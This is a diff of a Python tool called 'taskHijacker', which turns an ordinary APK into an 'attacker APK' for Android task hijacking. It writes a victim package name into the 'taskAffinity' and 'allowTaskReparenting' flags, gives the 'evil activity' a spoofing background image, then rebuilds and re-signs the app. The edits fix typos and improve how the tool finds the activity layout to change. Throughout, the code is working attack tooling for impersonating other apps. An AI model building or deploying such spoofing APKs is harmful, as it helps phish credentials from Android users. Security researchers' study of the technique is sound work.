@@ -74,7 +74,7 @@ def decode_apk(input_apk, verbose):
             if (outs is not None) and (len(outs) != 0):
                 print("[D] Decoding the APK: " + outs.decode("ascii"))
         if (errs is not None) and (len(errs) != 0):
-            print("[-] Error whend ecoding the APK: " + errs.decode("ascii"))
+            print("[-] Error when decoding the APK: " + errs.decode("ascii"))
             exit(1)
         return out_dir
     except FileNotFoundError as err:
@@ -99,7 +99,7 @@ def build_apk(input_apk, apk_dir, verbose):
                     build_ok = True
                 print("[+] Building the attacker APK: " + outs.decode("ascii"))
         if (errs is not None) and (len(errs) != 0) and not build_ok:
-            print("[-] Error whend ecoding the APK: " + errs.decode("ascii"))
+            print("[-] Error when encoding the APK: " + errs.decode("ascii"))
             exit(1)
         # Return the patched APK fullpath
         return patched_apk
@@ -154,6 +154,7 @@ def sign_apk(input_apk, verbose):
             line = input(">>> Enter your keystore fullpath: ")
             lines.append(line)
             count += 1
+
     if not lines[0]:
         print("[-] Error, in order to sign the APK you should enter a keystore fullpath during the signing procedue")
         exit(1)
@@ -282,7 +283,7 @@ def task_misconfig(input_dir, victim_package, evil_activity):
     # Extract the evil activity to modify
     activity_tag = get_activity_tag(manifest, main_activity, evil_activity)
     activity_tag = activity_tag[0]
-    print("[+] Inserting the 'taskAffinity' flag with the victim package-name value " + victim_package + "' on the evil activity'" + evil_activity + "'...")
+    print("[+] Inserting the 'taskAffinity' flag with the victim package-name value " + victim_package + "' on the evil activity '" + evil_activity + "'...")
     activity_tag.attrib["{http://schemas.android.com/apk/res/android}taskAffinity"] = victim_package
     # Writing the patched AndroidManifest.xml file
     manifest.write(os.path.join(input_dir, "AndroidManifest.xml"), encoding='utf-8', xml_declaration=True)
@@ -315,10 +316,15 @@ def task_cuckoo(input_dir, victim_package, evil_activity):
 
 
 def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
+    # Inject the image as background on the patched APK
     layout_file = ""
     layout_id = ""
-    # Inject the image as background on the patched APK
+    activities = []
     image_path = image_dir[4:]
+    # If the specified image folder does not exist it will be created on attacker APK
+    if not os.path.exists(apk_dir+"/"+image_dir):
+        os.makedirs(apk_dir+"/"+image_dir)
+        print("[!] Creating the image folder '" + apk_dir+"/"+image_dir + "' because it do not exists on attacker APK")
     copy = subprocess.Popen(["cp", image, apk_dir+"/"+image_dir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     outs, errs = copy.communicate()
     if verbose:
@@ -326,7 +332,6 @@ def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
             print("[D] Copying the backgroung image into the APK location '" + image_dir + "'.\n"  + outs.decode("ascii"))
     if (errs is not None) and (len(errs) != 0):
         raise Exception(errs.decode("ascii"))
-
     # Modify the layout file
     layout_dir = apk_dir + "/res/layout/"
     # Get image filename without extension from its fullpath
@@ -334,79 +339,103 @@ def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
     ElementTree.register_namespace("android", "http://schemas.android.com/apk/res/android")
     # Get package name and build the smali path for the decompiled APK
     smali_package = get_packagename(apk_dir).replace(".", "/")
+    main_activity = get_main_activity(apk_dir).lstrip(".")
+    activity_name_ok = False
+    if evil_activity:
+        activity_name = evil_activity
+    else:
+        activity_name = main_activity
     # Retrieving the layout filename of the activities to modify
-    for activity_name in ["MainActivity", evil_activity]:
-        if activity_name:
-            # Setting max search limit to 30 smali classes
-            for smali_count in range(31):
-                if smali_count == 0:
-                    smali_path = "/smali/"
-                else:
-                    smali_path = "/smali_classes" + str(smali_count) + "/"
-                # Starting the search for the specific malicious acivity smali file                
-                smali_filename = apk_dir + smali_path + smali_package + "/" + activity_name + ".smali"
-                if verbose:
-                    print("[D] Trying with activity file '" + smali_filename + "'...")
+    if not activity_name_ok:
+        # Setting max search limit to 30 smali classes
+        for smali_count in range(31):
+            if smali_count == 0:
+                smali_path = "/smali/"
+            else:
+                smali_path = "/smali_classes" + str(smali_count) + "/"
+            # Starting the search for the specific malicious acivity smali file
+            for tmp_activity_name in [activity_name, activity_name+"$1", activity_name+"$2", activity_name+"$3", activity_name+"$4"]:
+                smali_filename = apk_dir + smali_path + smali_package + "/" + tmp_activity_name + ".smali"
                 if os.path.isfile(smali_filename):
+                    if verbose:
+                        print("[D] Trying with activity file '" + smali_filename + "'...")
                     try:
                         smali_content = read_file(smali_filename)
                     except IOError:
                         print("[!] Not found the activity file '" + smali_filename + "', continuing the search..")
                         continue
                     # Retrieving the id of the searched layout file
-                    m_obj = re.search("onCreate.*(0x[a-fA-F0-9]{8}).*setContentView", smali_content, re.DOTALL)
-                    if m_obj:
-                        layout_id = m_obj.group(1)
+                    m_obj_1 = re.search("onCreate.*(0x[a-fA-F0-9]{8}).*setContentView", smali_content, re.DOTALL)
+                    m_obj_2 = re.search("initaliseActivity.*(0x[a-fA-F0-9]{8}).*setContentView", smali_content, re.DOTALL)
+                    if m_obj_1:
+                        layout_id = m_obj_1.group(1)
                         if verbose:
-                            print("[D] Found the identifier for the '" + activity_name + "' activity layout on " + layout_id)
+                            print("[D] Found the identifier for the '" + tmp_activity_name + "' activity layout on " + layout_id)
+                        activity_name = tmp_activity_name
                         break
-            # Setting max search limit to 30 smali classes
-            for smali_count in range(31):
-                if smali_count == 0:
-                    smali_path = "/smali/"
-                else:
-                    smali_path = "/smali_classes" + str(smali_count) + "/"
-                # Starting the search for the smali file containing the list of layout filenames
-                smali_layout_file = apk_dir + smali_path + smali_package + "/R$layout.smali"
-                if verbose:
-                    print("[D] Trying with layout file '" + smali_layout_file + "'...")
-                if os.path.isfile(smali_layout_file):
-                    try:
-                        smali_content = read_file(smali_layout_file)
-                    except IOError:
-                        print("[!] Not found the layout file '" + smali_layout_file + "', continuing the search..")
-                        continue
-                    # Retrieving the name of the searched layout file
-                    m_obj = re.search("static final ([\\w]+):[\\w]*?\\s]?\\=[\\s]?"+layout_id, smali_content, re.DOTALL)
-                    if m_obj:
-                        layout_file = m_obj.group(1)+".xml"
+                    if m_obj_2:
+                        layout_id = m_obj_2.group(1)
                         if verbose:
-                            print("[D] Found the layout filename for the '" + activity_name + "' activity on " + layout_file)
+                            print("[D] Found the identifier for the '" + tmp_activity_name + "' activity layout on " + layout_id)
+                        activity_name = tmp_activity_name
                         break
-            # Starting to change the app background
-            if layout_file:
-                # Search for the specific activity layout files recursively into layout folder
-                layout_dir = apk_dir + "/res/"
-                for rootpath, dirs, files in os.walk(layout_dir):
-                    for file in files:
-                        if file == layout_file:
-                            bg_path = rootpath+"/"+file
+            activity_name_ok = True
+            break
+        
+        if not activity_name_ok:
+            print("[-] Exiting, something goes wrong not found the evil activity on the attacker APK,. Try to check your APK contents..")
+            exit(1)
+        
+        # Setting max search limit to 30 smali classes
+        for smali_count in range(31):
+            if smali_count == 0:
+                smali_path = "/smali/"
+            else:
+                smali_path = "/smali_classes" + str(smali_count) + "/"
+            # Starting the search for the smali file containing the list of layout filenames
+            smali_layout_file = apk_dir + smali_path + smali_package + "/R$layout.smali"
+            if verbose:
+                print("[D] Trying with layout file '" + smali_layout_file + "'...")
+            if os.path.isfile(smali_layout_file):
+                try:
+                    smali_content = read_file(smali_layout_file)
+                except IOError:
+                    print("[!] Not found the layout file '" + smali_layout_file + "', continuing the search..")
+                    continue
+                # Retrieving the name of the searched layout file
+                m_obj = re.search("static final ([\\w]+):[\\w]*?\\s]?\\=[\\s]?"+layout_id, smali_content, re.DOTALL)
+                if m_obj:
+                    layout_file = m_obj.group(1)+".xml"
+                    if verbose:
+                        print("[D] Found the layout filename for the '" + activity_name + "' activity on " + layout_file)
+                    break
+                 
+        # Starting to change the app background
+        if layout_file:
+            # Search for the specific activity layout files recursively into layout folder
+            layout_dir = apk_dir + "/res/layout"
+            for rootpath, dirs, files in os.walk(layout_dir):
+                for file in files:
+                    if file == layout_file:
+                        bg_path = rootpath+"/"+file
+                        if verbose:
+                             print("[D] Found '" + activity_name + "' activity layout file on path '" + bg_path + "'")
+                        xml = ElementTree.parse(bg_path)
+                        root = xml.getroot()
+                        # Identify the root tag into the layout xml file and set the new background image on it
+                        for layout_type in ["RelativeLayout", "LinearLayout", "androidx.constraintlayout.widget.ConstraintLayout", "android.support.constraint.ConstraintLayout", "AbsoluteLayout", "FrameLayout", "GridLayout"]:
+                            layout_found = False
                             if verbose:
-                                 print("[D] Found '" + activity_name + "' activity layout file on path '" + bg_path + "'")
-                            xml = ElementTree.parse(bg_path)
-                            root = xml.getroot()
-                            # Identify the root tag into the layout xml file and set the new background image on it
-                            for layout_type in ["RelativeLayout", "LinearLayout", "androidx.constraintlayout.widget.ConstraintLayout", "android.support.constraint.ConstraintLayout", "AbsoluteLayout", "FrameLayout", "GridLayout"]:
-                                layout_found = False
-                                if root.tag == layout_type:
-                                    layout_found = True
-                                    main_layout_tag = root
-                                    main_layout_tag.attrib["{http://schemas.android.com/apk/res/android}background"] = "@" + image_path + image_name
-                                    # Changing the background of the specific activity
-                                    xml.write(bg_path, encoding='utf-8', xml_declaration=True)
-                                    break
-                            if not layout_found:
-                                print("[-] Warning, not found layout file for: '"+ file +"'. Try adding to the list of layout types the value: '"+root.tag+"'")      
+                                print("[D] Found layout type of '" + root.tag + "'")
+                            if root.tag == layout_type:
+                                layout_found = True
+                                main_layout_tag = root
+                                main_layout_tag.attrib["{http://schemas.android.com/apk/res/android}background"] = "@" + image_path + image_name
+                                # Changing the background of the specific activity
+                                xml.write(bg_path, encoding='utf-8', xml_declaration=True)
+                                break
+                        if not layout_found:
+                            print("[-] Warning, not found layout file for: '"+ file +"'. Try adding to the list of layout types the value: '"+root.tag+"'")      
     # Background modification is completed
     print("[+] Changed the background of the attacker APK using '" + image + "'")
     return
@@ -416,11 +445,11 @@ def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
 def main():
     # Handle the user input
     parser = argparse.ArgumentParser(prog="taskHijacker", epilog="Additional note: a keystore is needed in order to re-sign the patched attacker APK")
-    parser.add_argument("-m", "--misconfig_task", metavar="PACKAGE_NAME", help="Specify the package-name (or the target custom taskAffinity) of the victim APK to exploit victim APK task misconfigurations. It modifies only the the 'taskAffinity' flag into the attacker APK")
-    parser.add_argument("-c", "--cuckoo_task", metavar="PACKAGE_NAME", help="Specify the package-name (or the target custom taskAffinity) of the victim APK to exploit an unsafe Android OS feature. It modifies both the 'taskAffinity' and 'allowTaskReparenting' flags into the attacker APK")
-    parser.add_argument("-e", "--evil_activity", help="Specify the activity-name of the attacker APK used to perform the Task Hijacking attack (default is the main activity)")
+    parser.add_argument("-m", "--misconfig_task", metavar="PACKAGE_NAME", help="Specify the package-name of the victim APK to exploit victim APK task misconfigurations. It modifies only the the 'taskAffinity' flag into the attacker APK")
+    parser.add_argument("-c", "--cuckoo_task", metavar="PACKAGE_NAME", help="Specify the package-name of the victim APK to exploit an unsafe Android OS feature. It modifies both the 'taskAffinity' and 'allowTaskReparenting' flags into the attacker APK")
+    parser.add_argument("-e", "--evil_activity", help="Specify the activity-name of the attacker APK used to perform the Task Hijacking attack (by default is the main activity)")
     parser.add_argument("-i", "--img_bg", help="Specify the fullpath of the image file to set as background on the attacker APK")
-    parser.add_argument("-d", "--dir_bg", help="Specify the location where put the background image into the attacker APK. It should be a relative path within 'res/' folder (default is 'res/drawable/')", default="res/drawable/")
+    parser.add_argument("-d", "--dir_bg", help="Specify the location where put the background image into the attacker APK. It should be a relative path within 'res/' folder (by default is 'res/drawable/')", default="res/drawable/")
     parser.add_argument("-a", "--apk", help="Specify the fullpath of the APK to turn into the attacker APK. The new attacker APK will be generated on the same location", required=True)
     parser.add_argument("-v", "--verbose", help="Enable verbose output", action='store_true')
     args = parser.parse_args()
@@ -455,7 +484,7 @@ def main():
     # Check if the evil activity has been specified 
     evil_activity = args.evil_activity
     if evil_activity is None:
-        print("[+] The evil activity was not specified, by default the main activity of the attacker APK will be used...") 
+        print("[+] The evil activity was not specified, by default the main activity of the attacker APK will be used...")
     else:
         if ("." in evil_activity):
             evil_activity = evil_activity.rsplit(".", 1)[-1]
